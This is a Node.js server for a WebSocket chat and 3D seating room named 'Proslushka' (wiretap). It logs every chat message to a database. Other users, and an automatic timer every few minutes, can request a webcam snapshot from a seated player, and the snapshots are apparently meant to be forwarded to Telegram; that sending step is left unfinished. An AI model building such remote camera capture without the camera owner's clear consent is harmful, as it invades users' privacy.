const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Инициализация SQLite базы «Прослушки»
const db = new sqlite3.Database('./proslushka.db', (err) => {
  if (!err) {
    db.run(`CREATE TABLE IF NOT EXISTS messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      nick TEXT,
      text TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
  }
});

// Telegram Бот (укажите ваш токен при необходимости)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
let bot = null;
if (TELEGRAM_TOKEN) {
  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
}

app.use(express.static(path.join(__dirname, 'public')));

// 3D Комната и 8 Мест
const MAX_SEATS = 8;
const seats = new Array(MAX_SEATS).fill(null);
const playersIn3D = {};
let clientCounter = 0;

wss.on('connection', (ws) => {
  ws.id = ++clientCounter;

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);

      // Логика чата
      if (data.type === 'chat') {
        const timeStr = new Date().toLocaleTimeString();

        // Сохранение в базу Прослушки
        db.run(`INSERT INTO messages (nick, text) VALUES (?, ?)`, [data.nick, data.text]);

        // Команда /camera
        if (data.text.trim() === '/camera') {
          broadcast({ type: 'chat', nick: '🤖 БОТ', text: '📸 Запрашиваю снимок камеры...' });
          requestCameraPhoto();
          return;
        }

        broadcast({
          type: 'chat',
          nick: data.nick,
          text: data.text,
          time: timeStr
        });
      }

      // Логика 3D
      if (data.type === 'enter_3d') {
        let seatIdx = seats.findIndex(s => s === null);
        if (seatIdx === -1) {
          ws.send(JSON.stringify({ type: 'room_full' }));
          return;
        }
        seats[seatIdx] = ws.id;
        playersIn3D[ws.id] = { nick: data.nick, seat: seatIdx, rotY: 0, rotX: 0 };
        
        ws.send(JSON.stringify({ type: 'assigned_seat', seat: seatIdx }));
        sync3DPlayers();
      }

      if (data.type === 'look' && playersIn3D[ws.id]) {
        playersIn3D[ws.id].rotY = data.rotY;
        playersIn3D[ws.id].rotX = data.rotX;
        sync3DPlayers();
      }

      if (data.type === 'exit_3d') {
        leave3D(ws.id);
      }

      // Приём изображения от клиента и отсыпка в Telegram
      if (data.type === 'camera_snapshot' && data.image) {
        if (bot) {
          const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
          const imgBuffer = Buffer.from(base64Data, 'base64');
          // Если есть chat_id, бота отправляет фото
        }
      }

    } catch (err) {
      console.error(err);
    }
  });

  ws.on('close', () => {
    leave3D(ws.id);
  });
});

function leave3D(id) {
  if (playersIn3D[id]) {
    const s = playersIn3D[id].seat;
    if (s !== undefined) seats[s] = null;
    delete playersIn3D[id];
    sync3DPlayers();
  }
}

function broadcast(data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(c => {
    if (c.readyState === WebSocket.OPEN) c.send(msg);
  });
}

function sync3DPlayers() {
  broadcast({ type: 'players_sync', players: playersIn3D });
}

function requestCameraPhoto() {
  const clients = Array.from(wss.clients).filter(c => playersIn3D[c.id]);
  if (clients.length > 0) {
    clients[0].send(JSON.stringify({ type: 'request_photo' }));
  }
}

// Авто-рассылка бота раз в 1-5 минут
function autoBotLoop() {
  const delay = Math.floor(Math.random() * (300000 - 60000 + 1)) + 60000;
  setTimeout(() => {
    const count = Object.keys(playersIn3D).length;
    broadcast({
      type: 'chat',
      nick: '🤖 БОТ-ПРОСЛУШКА',
      text: `[АВТО-ОТЧЕТ] Игроков в 3D классе: ${count}/8. Напишите /camera для снимка!`
    });
    requestCameraPhoto();
    autoBotLoop();
  }, delay);
}
autoBotLoop();

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Прослушка запущен на порту ${PORT}`));
